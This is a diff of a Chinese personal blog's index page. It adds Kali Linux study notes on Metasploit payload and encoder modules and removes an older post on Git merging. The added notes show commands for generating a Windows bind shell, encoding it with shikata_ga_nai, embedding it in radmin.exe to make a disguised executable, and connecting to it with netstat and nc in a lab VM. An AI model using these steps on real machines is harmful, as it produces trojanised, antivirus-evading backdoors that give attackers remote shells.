@@ -240,6 +240,219 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%8C)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Payload%E3%80%81Encoders/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%8C)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Payload%E3%80%81Encoders/" itemprop="url">Kali Linux笔记(一百零二)：MSF模块--Payload、Encoders</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T23:20:54+08:00">
+                2020-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  377 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-payload模块和encoders模块"><a href="#1-payload模块和encoders模块" class="headerlink" title="1. payload模块和encoders模块"></a>1. payload模块和encoders模块</h4><ul>
+<li><strong><code>🔺命令：use payload/windows/shell_bind_tcp</code></strong><ul>
+<li>▲ 默认情况下Ruby语言的shellcode</li>
+<li>RHOST：用于限制来源IP，非发送IP </li>
+<li><strong><code>🔺命令：generate</code></strong>（坏字符）</li>
+</ul>
+</li>
+<li>msf自动选择编码绕过坏字符<ul>
+<li><strong><code>🔺命令：show encodes</code></strong>：查看可进行编码的模块</li>
+<li><strong><code>🔺命令：generate -b &#39;\x00&#39;</code></strong> </li>
+<li><strong><code>🔺命令：generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></strong> </li>
+<li><strong><code>🔺命令：generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b \xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26&#39;</code></strong>（过滤字符过多，可能没有编码方式）</li>
+</ul>
+</li>
+<li>手动指定编码模块<ul>
+<li>参数<ul>
+<li>-t：输出格式（可以使用C/python/java，generate -t c/python/java，默认为Ruby）▲ 2020.2.26 无-t操作，输出格式为-f</li>
+<li>-i：加密的轮数</li>
+<li>-k：不产生新的进程</li>
+<li>-x：使用的程序模板  </li>
+<li>-f：输出文件（包括路径）▲ 2020.2.26 -f操作为-o，-f为输出格式</li>
+<li>-n：NOP sled length（无操作的长度） ▲ 2020.2.26 -s操作修改为-n</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：generate -e x86/nonalpha</code></strong></li>
+<li><strong><code>🔺命令：generate -b &#39;\x00&#39; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exe</code></strong></li>
+<li>压缩1.exe为1.zip</li>
+<li><strong><code>🔺命令：cp 1.exe /mnt/hgfs/share</code></strong></li>
+<li>拷贝到win7的电脑端并解压</li>
+<li>win7双击启动，<strong><code>🔺命令：netstat -nao | findstr &quot;4444&quot;</code></strong>（看是否开启端口）</li>
+<li><strong><code>🔺命令：kali nc win7的IP 4444</code></strong></li>
+</ul>
+</li>
+<li>▲ NOP：no-operation / Next Operation（无任何操作）<ul>
+<li>EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</li>
+<li><strong><code>🔺命令：generate -n 14</code></strong></li>
+<li>比较有无NOP sled的payload的size长度</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Exploit/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2263,260 +2476,6 @@ reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/Git%E7%AC%94%E8%AE%B0-4%EF%BC%9AGit%E7%9A%84%E5%90%88%E5%B9%B6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/20/Git%E7%AC%94%E8%AE%B0-4%EF%BC%9AGit%E7%9A%84%E5%90%88%E5%B9%B6/" itemprop="url">Git笔记-4：Git的合并</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T16:24:49+08:00">
-                2020-02-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Git/" itemprop="url" rel="index">
-                    <span itemprop="name">Git</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  409 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Git的合并"><a href="#1-Git的合并" class="headerlink" title="1. Git的合并"></a>1. Git的合并</h4><ul>
-<li>▲ 可以在Stackoverflow上看git log多样格式</li>
-<li>▲ rebase的黄金法则：绝对不要在公共分支使用rebase</li>
-<li>查看日志：git log<ul>
-<li>–oneline：一行的提交信息</li>
-<li>–oneline -3：只取前面3行</li>
-</ul>
-</li>
-<li>查看添加的内容：<strong><code>🔺命令：git show 哈希值</code></strong></li>
-<li>查看提交方式：<strong><code>🔺命令：git merge --help</code></strong><ul>
-<li>–ff（fast-forward）：默认不产生一次commit</li>
-<li>–no-ff：产生一个commit</li>
-</ul>
-</li>
-<li>移动分支，并将master分支的提交并入：<strong><code>🔺命令：git rebase</code></strong></li>
-<li>查看版本分支报错情况：<strong><code>🔺命令：git mergetool</code></strong><ul>
-<li>通过工具修改后，会生成一个x.txt.orig，保存冲突的现场</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>   merge和rebase<br>   merge：两个分支的修改提交，默认不提交，关注点在合并操作上<br>   rebase：将当前分支做的修改，复制在目标分支的最后一次中，关注点在开发的过程上 </p>
-</blockquote>
-<h4 id="2-Git-tutorial-Repository"><a href="#2-Git-tutorial-Repository" class="headerlink" title="2. Git-tutorial Repository"></a>2. Git-tutorial Repository</h4><ul>
-<li>cd git-tutorial</li>
-<li>git branch -d f1</li>
-<li>git push origin :f1</li>
-<li>git log</li>
-<li>q</li>
-<li>git log –oneline</li>
-<li>git log –oneline -3</li>
-<li>git show d156c23</li>
-<li>vi ~/.config → dog = log –all –decorate –oneline –graph</li>
-<li>git dog</li>
-<li>git checkout -b f1</li>
-<li>touch fa.txt</li>
-<li>git add fa.txt</li>
-<li>git commit -m “add fa”</li>
-<li>git dog</li>
-<li>git checkout master</li>
-<li>git merge f1</li>
-<li>git dog</li>
-<li>git checkout f1</li>
-<li>touch fb.txt</li>
-<li>git commit -m “add fb”</li>
-<li>git checkout f1</li>
-<li>git merge f1 –no-ff</li>
-<li>git dog</li>
-<li>git push</li>
-<li>git push origin f1</li>
-<li>远程修改master中的a.txt</li>
-<li>git pull</li>
-<li>git checkout f1</li>
-<li>git merge master</li>
-<li>git dog</li>
-<li>git checkout master</li>
-<li>touch m1.txt</li>
-<li>git add m1.txt</li>
-<li>git commit -m “add m1”</li>
-<li>git checkout f1</li>
-<li>git dog</li>
-<li>git rebase</li>
-<li>git dog</li>
-<li>git checkout -b f2</li>
-<li>vim a.txt</li>
-<li>this is b.txt</li>
-<li>git add a.txt</li>
-<li>git commit -m “update a.txt”</li>
-<li>git checkout f1</li>
-<li>vi a.txt</li>
-<li>this is c.txt</li>
-<li>git add a.txt</li>
-<li>git commit -m “update c.txt”</li>
-<li>git checkout f2</li>
-<li>git merge f1</li>
-<li>cat a.txt</li>
-<li>git mergetool</li>
-<li>rm a.txt.orig</li>
-<li>git commit -m “update a.txt”</li>
-<li>git dog</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2571,7 +2530,7 @@ reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">168</span>
+                  <span class="site-state-item-count">169</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2678,7 +2637,7 @@ reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">151.3k</span>
+    <span title="Site words total count">152k</span>
   
 </div>
 
